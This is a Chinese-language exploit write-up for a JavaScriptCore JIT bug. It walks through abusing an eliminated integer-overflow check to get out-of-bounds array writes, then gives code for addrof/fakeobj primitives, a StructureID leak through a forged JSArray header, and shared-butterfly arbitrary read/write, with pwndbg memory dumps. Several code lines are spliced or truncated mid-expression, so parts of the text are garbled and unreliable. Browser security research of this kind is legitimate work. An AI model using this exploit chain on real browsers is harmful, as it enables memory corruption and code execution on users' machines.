## 环境搭建
    git checkout 17218d1485b0f5d98d2aad116d4fdb2bad6aee2d
    git child1().useKind() == Int32Use || ...)
                def(PureValue(node));          //  -2147483648 | 0
    -2147483648
    js> 2147483648 | 0
    -2147483648
（2）接下来要构造`i = ArithNeg(checked) n`
通过ArithAbs操作实现，只有当传入的n为负数时，才会将ArithAbs转化成ArithNegate操作进行检查，因为正数的绝对值是它本身，不会造成溢出，也不用取反。因此完成以下的构造：
    n = n|0;
    if (n  0) { // 由于前面的减法，IntegerRangeOptimization无法确定idx是否恒大于等于0，所以要加判断
                    return arr[idx] = 1.04380972981885e-310;  // i2f(0x133700001337);
                }
            }
        }
    }
通过`idx-0x7ffffffd` 使idx=3，因为此时JIT认为idx恒为正数，减去0x7ffffffd
并不会造成溢出，所以消除了ArithAdd的检查，所以从进入`idx canGetIndexQuickly(i))
                    return object->getIndexQuickly(i); // 【1】
getIndexQuickly直接从butterfly加载元素，而canGetIndexQuickly只查看JSCell头部中的索引类型和butterfly中的length：
    bool canGetIndexQuickly(unsigned i) const {
        const Butterfly* butterfly = this->butterfly();
        switch (indexingType()) {
        ...;
        case ALL_CONTIGUOUS_INDEXING_TYPES:
            return i vectorLength() && butterfly->contiguous().at(this, i);
    }
我们可以伪造一个JSArray对象，填充无效的StructureID等头部字段（因为getByVal路径上不验证，所以不会报错），然后将butterfly填充为要泄露的目标对象地址，就可以将目标对象的结构当成数据输出。
泄露StructureID的代码如下：
    // leak entropy by getByVal
    function LeakStructureID(obj)
    {
        let container = {
            cellHeader: i2obj(0x0108230700000000), // 伪造的JSArray头部，包括StructureID等字段
            butterfly: obj
        };
        let fakeObjAddr = AddrOf(container) + 0x10;
        let fakeObj = FakeObj(fakeObjAddr);
        f64[0] = fakeObj[0];// 访问元素会调用getByVal
        //此时fakeObj[0]为Legitimate JSArray的JSCell，fakeObj[1]为Legitimate JSArray的butterfly
        // repair the fakeObj's jscell
        let structureID = u32[0];
        u32[1] = 0x01082307 - 0x20000;
        container.cellHeader = f64[0];
        return structureID;
    }
内存布局如下：
    // container 对象：
    Object: 0x7fe0cc78c000 with butterfly (nil) (Structure 0x7fe0cc7bfde0:[0xd0bd, Object, {cellHeader:0, butterfly:1}, NonArray, Proto:0x7fe10cbf6de8, Leaf]), StructureID: 53437
    pwndbg> x/4gx 0x7fe0cc78c000
    0x7fe0cc78c000: 0x010018000000d0bd  0x0000000000000000
    0x7fe0cc78c010: 0x0108230700000000  0x00007fe10cb7cae8 //  x/gx 0x00007fe10cb7cae8
    0x7fe10cb7cae8: 0x010823070000f1aa // <---- StructureID被当作数据输出
### 构造任意地址读写
泄露StructureID后，我们可以仿造泄露StructureID方法一那样构造一个JSArray，只不过现在StructureID填充的是有效的，可以根据Butterfly进行读写。
（1）首先伪造一个driver object，类型为对象类型数组，将driver object 的butterfly 指向victim
object，此时访问driver[1]就可以访问victim
object的butterfly，之后申请一个ArrayWithDouble（浮点数类型）的数组unboxed，通过driver[1] = unboxed
将victim object的butterfly填充为unboxed对象地址，同理此时访问victim[1]就可以访问unboxed object
的butterfly。
这一步我们可以泄露unboxed object的butterfly内容。代码如下：
    var victim = [noCoW, 14.47, 15.57];
    victim['prop'] = 13.37;
    victim['prop_1'] = 13.37;
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    var container = {
        cellHeader: f64[0],
        butterfly: victim   
    };
    // build fake driver
    var containerAddr = AddrOf(container);
    var fakeArrAddr = containerAddr + 0x10;
    var driver = FakeObj(fakeArrAddr);
    // ArrayWithDouble
    var unboxed = [noCoW, 13.37, 13.37];
    // leak unboxed butterfly's addr
    driver[1] = unboxed;
    var sharedButterfly = victim[1];
    print("[+] shared butterfly addr: " + hex(f2i(sharedButterfly)));
（2）申请一个ArrayWithContiguous（对象类型）的数组boxed，和第一步一样，将driver[1]覆盖成boxed
object地址就可以通过victim[1] 对boxed object的butterfly进行操作。将第一步泄露的unboxed object
butterfly内容填充到boxed object的butterfly，这样两个对象操作的就是同一个butterfly，可以方便构造新的addrof 和
fakeobj原语。
代码如下：
    var boxed = [{}];
    driver[1] = boxed;
    victim[1] = sharedButterfly;
    function NewAddrOf(obj) {
        boxed[0] = obj;
        return f2i(unboxed[0]);
    }
    function NewFakeObj(addr) {
        unboxed[0] = i2f(addr);
        return boxed[0];            
    }
（3）将driver object的类型修改成浮点型数组类型，将victim object 的butterfly
修改成target_addr+0x10，因为butterfly是指向length和elem0中间，而属性1prop位于butterfly-0x10的位置，访问victim.prop相当于访问butterfly-0x10
=（target_addr+0x10）-0x10=target_addr。